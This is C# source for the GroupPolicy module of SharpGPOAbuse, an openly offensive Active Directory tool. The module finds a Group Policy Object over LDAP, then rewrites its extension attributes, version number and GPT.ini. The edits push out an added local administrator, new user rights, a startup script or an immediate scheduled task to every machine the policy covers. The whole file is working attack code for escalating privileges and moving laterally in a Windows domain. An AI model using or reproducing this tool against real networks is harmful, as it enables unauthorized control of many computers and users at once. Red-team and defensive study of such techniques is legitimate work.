using System;
using System.IO;
using System.DirectoryServices;
using System.Collections.Generic;
using System.DirectoryServices.Protocols;

namespace SharpGPOAbuse
{
    public class GroupPolicy
    {
        public static string GetGPOGUID(string DomainController, string GPOName, string DistinguishedName)
        {
            // Translate GPO Name to GUID
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(DomainController, 389);

            LdapConnection connection = new LdapConnection(identifier);
            connection.SessionOptions.Sealing = true;
            connection.SessionOptions.Signing = true;
            connection.Bind();

            var new_request = new SearchRequest(DistinguishedName, $"(displayName={GPOName})", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
            var new_response = (SearchResponse)connection.SendRequest(new_request);
            var GPOGuid = "";
            foreach (SearchResultEntry entry in new_response.Entries)
            {
                try
                {
                    GPOGuid = entry.Attributes["cn"][0].ToString();
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("[!] Could not retrieve the GPO GUID. {0}", e.Message);
                }
            }
            if (string.IsNullOrEmpty(GPOGuid))
            {
                Console.Error.WriteLine("[!] Could not retrieve the GPO GUID.");
            }

            Console.WriteLine($"[+] GUID of {GPOName} is: {GPOGuid}");
            return GPOGuid;
        }

        public static void UpdateVersion(string Domain, string DistinguishedName, string GPOName, string GPTPath, string AbuseFunction, string ObjectType)
        {
            string line = "";
            string[] requiredProperties;
            string gPCExtensionName;
            List<string> new_list = new List<string>();

            if (!File.Exists(GPTPath))
            {
                Console.WriteLine("[-] Could not find GPT.ini. The group policy might need to be updated manually using 'gpupdate /force'");
            }

            // get the object of the GPO and update its versionNumber
            DirectoryEntry myldapConnection = new DirectoryEntry(Domain);
            myldapConnection.Path = $"LDAP://{DistinguishedName}";
            myldapConnection.AuthenticationType = AuthenticationTypes.Secure;
            DirectorySearcher search = new DirectorySearcher(myldapConnection);
            search.Filter = $"(displayName={GPOName})";
            if (ObjectType.Equals("Computer"))
            {
                requiredProperties = new string[] { "versionNumber", "gPCMachineExtensionNames" };
                gPCExtensionName = "gPCMachineExtensionNames";
            }
            else
            {
                requiredProperties = new string[] { "versionNumber", "gPCUserExtensionNames" };
                gPCExtensionName = "gPCUserExtensionNames";
            }

            foreach (string property in requiredProperties)
                search.PropertiesToLoad.Add(property);

            SearchResult result = null;

            try
            {
                result = search.FindOne();
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[!] {0}", e.Message);
                return;
            }

            int new_ver = 0;
            if (result != null)
            {
                DirectoryEntry entryToUpdate = result.GetDirectoryEntry();

                // get AD number of GPO and increase it by 1 or 65536 if it is a computer or user object respectively
                if (ObjectType.Equals("Computer"))
                {
                    new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 1;
                    entryToUpdate.Properties["versionNumber"].Value = new_ver;
                }
                else
                {
                    new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 65536;
                    entryToUpdate.Properties["versionNumber"].Value = new_ver;
                }


                // update gPCMachineExtensionNames
                string val1 = "";
                string val2 = "";
                if (AbuseFunction == "AddLocalAdmin" || AbuseFunction == "AddNewRights" || AbuseFunction == "NewStartupScript")
                {

                    if (AbuseFunction == "AddLocalAdmin" || AbuseFunction == "AddNewRights")
                    {
                        val1 = "827D319E-6EAC-11D2-A4EA-00C04F79F83A";
                        val2 = "803E14A0-B4FB-11D0-A0D0-00A0C90F574B";
                    }

                    if (AbuseFunction == "NewStartupScript")
                    {
                        val1 = "42B5FAAE-6536-11D2-AE5A-0000F87571E3";
                        val2 = "40B6664F-4972-11D1-A7CA-0000F87571E3";
                    }

                    try
                    {
                        if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
                        {
                            if (entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val1))
                            {
                                string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
#if DEBUG
                                Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
#endif
                                List<string> new_values = new List<string>();
                                string addition = val2;
                                var test = ent.Split('[');

                                foreach (string i in test)
                                {
                                    new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
                                }

                                for (var i = 1; i < new_values.Count; i++)
                                {
                                    if (new_values[i].Contains(val1))
                                    {
                                        List<string> toSort = new List<string>();
                                        string[] test2 = new_values[i].Split();
                                        for (var f = 1; f < test2.Length; f++)
                                        {
                                            toSort.Add(test2[f]);
                                        }
                                        toSort.Add(addition);
                                        toSort.Sort();
                                        new_values[i] = test2[0];
                                        foreach (string val in toSort)
                                        {
                                            new_values[i] += " " + val;
                                        }
                                    }
                                }

                                List<string> new_values2 = new List<string>();
                                for (var i = 0; i < new_values.Count; i++)
                                {
                                    if (string.IsNullOrEmpty(new_values[i])) { continue; }
                                    string[] value1 = new_values[i].Split();
                                    string new_val = "";
                                    for (var q = 0; q < value1.Length; q++)
                                    {
                                        if (string.IsNullOrEmpty(value1[q])) { continue; }
                                        new_val += "{" + value1[q] + "}";
                                    }
                                    new_val = "[" + new_val + "]";
                                    new_values2.Add(new_val);
                                }
                                string final = string.Join("", new_values2.ToArray());
#if DEBUG
                                Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
#endif
                                entryToUpdate.Properties[gPCExtensionName].Value = final;
                            }

                            else
                            {
                                string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
#if DEBUG
                                Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
#endif
                                List<string> new_values = new List<string>();
                                string addition = val1 + " " + val2;
                                var test = ent.Split('[');

                                foreach (string i in test)
                                {
                                    new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
                                }
                                new_values.Add(addition);
                                new_values.Sort();
                                List<string> new_values2 = new List<string>();

                                for (var i = 0; i < new_values.Count; i++)
                                {
                                    if (string.IsNullOrEmpty(new_values[i])) { continue; }
                                    string[] value1 = new_values[i].Split();
                                    string new_val = "";
                                    for (var q = 0; q < value1.Length; q++)
                                    {
                                        if (string.IsNullOrEmpty(value1[q])) { continue; }
                                        new_val += "{" + value1[q] + "}";
                                    }
                                    new_val = "[" + new_val + "]";
                                    new_values2.Add(new_val);
                                }
                                string final = string.Join("", new_values2.ToArray());
#if DEBUG
                                Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
#endif
                                entryToUpdate.Properties[gPCExtensionName].Value = final;
                            }

                        }
                        else
                        {
#if DEBUG
                            Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
#endif
                        }
                    }
                    // the following will execute when the gPCMachineExtensionNames is <not set>
                    catch
                    {
                        entryToUpdate.Properties[gPCExtensionName].Value = "[{" + val1 + "}{" + val2 + "}]";
                    }

                }

                // update gPCMachineExtensionNames to add immediate task
                if (AbuseFunction == "NewImmediateTask")
                {
                    val1 = "00000000-0000-0000-0000-000000000000";
                    val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72";
                    string val3 = "AADCED64-746C-4633-A97C-D61349046527";

                    try
                    {
                        if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
                        {
                            string toUpdate = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
#if DEBUG
                            Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + toUpdate);
#endif
                            List<string> new_values = new List<string>();
                            var test = toUpdate.Split('[');

                            foreach (string i in test)
                            {
                                new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
                            }

                            // if zero GUID not in current value
                            if (!toUpdate.Contains(val1))
                            {
                                new_values.Add(val1 + " " + val2);
                            }

                            // if zero GUID exists in current value
                            else if (toUpdate.Contains(val1))
                            {
                                for (var k = 0; k < new_values.Count; k++)
                                {
                                    if (new_values[k].Contains(val1))
                                    {
                                        List<string> toSort = new List<string>();
                                        string[] test2 = new_values[k].Split();
                                        for (var f = 1; f < test2.Length; f++)
                                        {
                                            toSort.Add(test2[f]);
                                        }
                                        toSort.Add(val2);
                                        toSort.Sort();
                                        new_values[k] = test2[0];
                                        foreach (string val in toSort)
                                        {
                                            new_values[k] += " " + val;
                                        }
                                    }
                                }
                            }

                            // if Scheduled Tasks GUID not in current value
                            if (!toUpdate.Contains(val3))
                            {
                                new_values.Add(val3 + " " + val2);
                            }

                            else if (toUpdate.Contains(val3))
                            {
                                for (var k = 0; k < new_values.Count; k++)
                                {
                                    if (new_values[k].Contains(val3))
                                    {
                                        List<string> toSort = new List<string>();
                                        string[] test2 = new_values[k].Split();
                                        for (var f = 1; f < test2.Length; f++)
                                        {
                                            toSort.Add(test2[f]);
                                        }
                                        toSort.Add(val2);
                                        toSort.Sort();
                                        new_values[k] = test2[0];
                                        foreach (string val in toSort)
                                        {
                                            new_values[k] += " " + val;
                                        }
                                    }
                                }
                            }

                            new_values.Sort();

                            List<string> new_values2 = new List<string>();
                            for (var i = 0; i < new_values.Count; i++)
                            {
                                if (string.IsNullOrEmpty(new_values[i])) { continue; }
                                string[] value1 = new_values[i].Split();
                                string new_val = "";
                                for (var q = 0; q < value1.Length; q++)
                                {
                                    if (string.IsNullOrEmpty(value1[q])) { continue; }
                                    new_val += "{" + value1[q] + "}";
                                }
                                new_val = "[" + new_val + "]";
                                new_values2.Add(new_val);
                            }
                            string final = string.Join("", new_values2.ToArray());
#if DEBUG
                            Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
#endif
                            entryToUpdate.Properties[gPCExtensionName].Value = final;
                        }
                        else
                        {
#if DEBUG
                            Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
#endif
                        }
                    }
                    // the following will execute when the gPCMachineExtensionNames is <not set>
                    catch
                    {
                        entryToUpdate.Properties[gPCExtensionName].Value = "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]";
                    }
                }

                try
                {
                    // Commit changes to the security descriptor
                    entryToUpdate.CommitChanges();
                    Console.WriteLine("[+] versionNumber attribute changed successfully");
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("[!] Could not update versionNumber attribute. {0}", e.Message);
                    return;
                }
            }
            else
            {
                Console.Error.WriteLine("[!] GPO not found.");
                return;
            }

            using (StreamReader file = new StreamReader(GPTPath))
            {
                while ((line = file.ReadLine()) != null)
                {
                    if (line.Replace(" ", "").Contains("Version="))
                    {
                        line = line.Split('=')[1];
                        line = "Version=" + Convert.ToString(new_ver);

                    }
                    new_list.Add(line);
                }
            }

            using (StreamWriter file2 = new StreamWriter(GPTPath))
            {
                foreach (string l in new_list)
                {
                    file2.WriteLine(l);
                }
            }
            Console.WriteLine("[+] The version number in GPT.ini was increased successfully.");

            if (AbuseFunction == "AddLocalAdmin")
            {
                Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.");
                Console.WriteLine("[+] Done!");
            }

            else if (AbuseFunction == "NewStartupScript")
            {
                Console.WriteLine("[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.");
                Console.WriteLine("[+] Done!");
            }

            else if (AbuseFunction == "NewImmediateTask")
            {
                Console.WriteLine("[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.");
                Console.WriteLine("[+] Done!");
            }

            else if (AbuseFunction == "AddNewRights")
            {
                Console.WriteLine("[+] The GPO was modified to assign new rights to target user. Wait for the GPO refresh cycle.");
                Console.WriteLine("[+] Done!");
            }
        }
    }
}